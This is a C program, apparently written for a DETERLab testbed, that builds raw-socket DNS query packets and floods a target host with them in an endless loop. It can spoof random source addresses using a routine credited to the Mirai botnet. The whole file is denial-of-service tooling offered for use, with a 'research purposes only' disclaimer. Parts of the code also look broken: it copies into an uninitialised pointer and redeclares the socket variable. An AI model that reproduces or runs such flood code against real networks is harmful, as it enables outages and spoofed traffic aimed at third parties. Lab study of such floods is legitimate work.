/*
Generate a UDP flood

For research purposes only, please use responsibly

Author: Samuel DeLaughter
License: MIT
*/

#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <errno.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>
#include <linux/if_ether.h>

#define DEBUG 1 // Set verbosity
#define DELAY 0 // Set delay between packets in seconds
#define RAND_SRC_ADDR 0 // Toggle source address randomization
#define RAND_SRC_PORT 0 // Toggle source port randomization

/*
	Maximum total packet size.  This could be larger, but packets over 1500 bytes
	may exceed some path MTUs.  Plus UDP floods tend to use very small packets in
	order to maximize per-packet overhead in the network.
*/

enum dns_query_type {
	DNS_A_RECORD = 0x01,
	DNS_CNAME_RECORD = 0x05,
	DNS_MX_RECORD = 0x0f,
};

const uint32_t MAX_PACKET_SIZE = 1500;

// Default Source IP, in case we aren't randomizing
const char default_src_addr[32] = "10.0.5.1";

// Placeholder, destination IP must be specified with argv[1]
const char default_dst_addr[32] = "10.0.1.2";

// Default Source Port, in case we aren't randomizing
const uint16_t default_src_port = 53;

// Destination Port, unless otherwise specified with argv[2]
const uint16_t default_dst_port = 53; // 53 is DNS

struct pseudo_header {
	u_int32_t source_address;
	u_int32_t dest_address;
	u_int8_t placeholder;
	u_int8_t protocol;
	u_int16_t udp_length;
};

struct dns_header {
	uint16_t	tid;		/* Transaction ID */
	uint16_t	flags;		/* Flags */
	uint16_t	nqueries;	/* Questions */
	uint16_t	nanswers;	/* Answers */
	uint16_t	nauth;		/* Authority PRs */
	uint16_t	nother;		/* Other PRs */
	unsigned char	data[1];	/* Data, variable length */
} __attribute__((packed));

static void update_ip_csum(struct iphdr* iph, __be32 old_saddr) {
	// Experimental, beware
	if (old_saddr == iph->saddr){
		return;
	}
	__sum16 sum =  + (~ntohs(*(unsigned short *)&iph->saddr) & 0xffff);
	sum += ntohs(iph->check);
	sum = (sum & 0xffff) + (sum>>16);
	iph->check = htons(sum + (sum>>16) + 1);
}

static void update_udp_csum(struct iphdr* iph, struct udphdr* udph, __be32 old_saddr) {
	// Experimental, beware
	if (old_saddr == iph->saddr){
		return;
	}
	__sum16 sum =  + (~ntohs(*(unsigned short *)&iph->saddr) & 0xffff);
	sum += ntohs(udph->check);
	sum = (sum & 0xffff) + (sum>>16);
	udph->check = htons(sum + (sum>>16) + 1);
}

static uint32_t random_ipv4(void) {
	// Adapted from Mirai (https://github.com/jgamblin/Mirai-Source-Code)
	uint32_t addr;
	uint8_t o1, o2, o3, o4;

	do {
		addr = (uint32_t)(rand());
		o1 = addr & 0xff;
		o2 = (addr >> 8) & 0xff;
		o3 = (addr >> 16) & 0xff;
		o4 = (addr >> 24) & 0xff;
	}

	while (
		// Skip private and reserved addresses, and DETERLab's network
		// https://en.wikipedia.org/wiki/Reserved_IP_addresses#IPv4

		(o1 == 0) ||                              // 0.0.0.0/8        - Curreent Network
		(o1 == 10) ||                             // 10.0.0.0/8       - Private
		(o1 == 100 && o2 >= 64 && o2 < 128) ||   // 100.64.0.0/10     - Carrier grade NAT
		(o1 == 127) ||                            // 127.0.0.0/8      - Loopback
		(o1 == 169 && o2 == 254) ||               // 169.254.0.0/16   - Link-local
		(o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/12    - Private
		(o1 == 192 &&	(
			(o2 == 0 && (
				o3 == 0 || 														// 192.0.0.0/24			- Private
				o3 == 2																// 192.0.2.0/24			- Documentation
			)) ||
			(o2 == 88 && o3 == 99) ||								// 192.88.99.0/24		- Reserved
			(o2 == 168)															// 192.168.0.0/16		- Private
		)) ||
		(o1 == 198 && (
			(o2 == 18 || o2 == 19) ||								// 198.18.0.0/15		- Private
			(o2 == 51 && o3 == 100)									// 198.51.100.0/24	- Documentation
		)) ||
		(o1 == 203 && o2 == 0 && o3 == 113) ||    // 203.0.113.0/24   - Documentation
		(o1 == 206 && o2 == 117 && o3 == 25) ||		// 206.117.25.0/24	- DeterLab
		(o1 == 206 && o2 == 117 && o3 == 31) ||		// 206.117.31.0/24	- DeterLab High Performance
		(o1 >= 224)                               // 224.0.0.0+       - Various multicast/reserved
	);
	return addr;
}

static uint16_t random_port(void) {
	uint32_t port = (uint32_t)(rand()) & 0xff;
	return port;
}


// The standard function for calculating Internet checksums
unsigned short csum(unsigned short *ptr,int nbytes) {
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum=0;
	while(nbytes>1) {
		sum+=*ptr++;
		nbytes-=2;
	}
	if(nbytes==1) {
		oddbyte=0;
		*((u_char*)&oddbyte)=*(u_char*)ptr;
		sum+=oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;

	return(answer);
}

int main(int argc, char *argv[]) {
	// Create a raw socket
	int s = socket (PF_INET, SOCK_RAW, IPPROTO_UDP);

	if(s == -1) {
		// Socket creation failed, may be because of non-root privileges
		perror("Failed to create socket, do you have root priviliges?");
		exit(1);
	}

	// Get target (and optionally source) IP address
	char dst_addr[32] = default_dst_addr;
	uint16_t dst_port = default_dst_port;

	// if (argc > 1) {
		// strcpy(dst_addr, argv[1]);
		// if (argc > 2) {
			// dst_port = (uint16_t)atoi(argv[2]);
		// } else {
			// dst_port = default_dst_port;
		// }
	// } else {
		// printf("Please specify a target IP address, and optionally a port number (default destination port is 53).\nExample usage: syn_flood 127.0.0.1 80\n");
		// exit(1);
	// }

#if DEBUG
	printf ("Flooding target %s:%u\n", dst_addr, dst_port);

	#if RAND_SRC_ADDR
		printf("Randomizing source address\n");
	#else
		printf("Using source address %s\n", default_src_addr);
	#endif

	#if RAND_SRC_PORT
		printf("Randomizing source port\n");
	#else
		printf("Using source port %u\n", default_src_port);
	#endif
#endif


	// Seed RNG
	srand(time(NULL));

	// Byte array to hold the full packet
	char datagram[MAX_PACKET_SIZE];

	// Pointer for the packet payload
	char *data;

	// Pointer for the pseudo-header used in UDP checksum
	char *pseudogram;

	// Zero out the packet buffer
	memset (datagram, 0, MAX_PACKET_SIZE);

	// Initialize headers
	struct iphdr *iph = (struct iphdr *) datagram;
	struct udphdr *udph = (struct udphdr *) (datagram + sizeof (struct ip));
	struct dns_header *dnsh = (struct dns_header *) (datagram + sizeof(struct ip) + sizeof(struct udp));
	struct pseudo_header psh;

	// UDP Payload
	data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dns_header);
	// strcpy(data, "Hello, world!");

	// Address resolution
	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(dst_port);
	sin.sin_addr.s_addr = inet_addr(dst_addr);

	// IP Header
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (struct dns_header) + strlen(data);
	iph->id = htonl(0);	//ID of this packet, can be any value
	iph->frag_off = 0;
	iph->ttl = 255;
	iph->protocol = IPPROTO_UDP;
	iph->check = 0;		//Set to 0 before calculating checksum
	iph->saddr = inet_addr(default_src_addr);
	iph->daddr = sin.sin_addr.s_addr;

	// IP checksum
	iph->check = csum ((unsigned short *) datagram, iph->tot_len);

	// UDP Header
	udph->source = htons(default_src_port);
	udph->dest = sin.sin_port;
	udph->len = htons(sizeof(struct udphdr) + sizeof(struct dns_header) + strlen(data));
	udph->check = 0;

	// UDP checksum
	psh.source_address = inet_addr(default_src_addr);
	psh.dest_address = sin.sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_UDP;
	psh.udp_length = htons(sizeof(struct udphdr) + sizeof(struct dns_header) + strlen(data));

	int psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + sizeof(struct dns_header) + strlen(data);
	pseudogram = malloc(psize);

	memcpy(pseudogram, (char*) &psh, sizeof (struct pseudo_header));
	memcpy(pseudogram + sizeof(struct pseudo_header), udph, sizeof(struct udphdr) + sizeof(struct dns_header) + strlen(data));

	udph->check = csum((unsigned short*) pseudogram, psize);

	//IP_HDRINCL to tell the kernel that headers are included in the packet
	int option_value = 1;
	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (void *)&option_value, sizeof(option_value)) < 0) {
		perror("Error setting IP_HDRINCL");
		exit(1);
	}

	dnsh->tid = 1;
	dnsh->flags = htons(0x100);
	dnsh->nqueries = htons(1);
	dnsh->nanswers = 0;
	dnsh->nauth = 0;
	dnsh->nother = 0;
	
	int n, name_len;
	uchar *p;
	const char *s;
	const char *name;
	enum dns_query_type qtype = DNS_A_RECORD;
	strcpy(name, "www.google.com");
	name_len = strlen(name);
	p = (uchar *)&dnsh->data;

	do {
		s = strchr(name, '.');
		if (!s)
			s = name + name_len;

		n = s - name;			/* Chunk length */
		*p++ = n;			/* Copy length  */
		memcpy(p, name, n);		/* Copy chunk   */
		p += n;

		if (*s == '.')
			n++;

		name += n;
		name_len -= n;
	} while (*s != '\0');

	*p++ = 0;			/* Mark end of host name */
	*p++ = 0;			/* Some servers require double null */
	*p++ = (unsigned char) qtype;	/* Query Type */

	*p++ = 0;
	*p++ = 1;				/* Class: inet, 0x0001 */

	__be32 old_saddr;
	__be32 new_saddr;

	// Generate packets forever, the caller must terminate this program manually
	while(1) {
		#if RAND_SRC_ADDR || RAND_SRC_PORT
			#if RAND_SRC_ADDR
			// Generate a new random source IP, excluding certain prefixes
				new_saddr = (__be32)(random_ipv4());
			#endif

			#if RAND_SRC_PORT
				udph->source = random_port();
			#endif

			iph->check = 0;
			iph->saddr = new_saddr;
			iph->check = csum ((unsigned short *) datagram, iph->tot_len);

			udph->check = 0;
			psh.source_address = new_saddr;
			memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
			memcpy(pseudogram + sizeof(struct pseudo_header) , udph , sizeof(struct udphdr) + sizeof(struct dns_header) + strlen(data));
			udph->check = csum( (unsigned short*) pseudogram , psize);
		#endif

		//Send the packet
		if (sendto (s, datagram, iph->tot_len ,	0, (struct sockaddr *) &sin, sizeof (sin)) < 0) {
			perror("Error sending packet");
		}

		#if DEBUG > 1
			printf("Sent packet from %s:%u to %s:%u\n", iph->saddr, udph->source, iph->daddr, udph->dest);
		#endif

		#if DELAY
			sleep(DELAY);
		#endif
	}

	return 0;
}
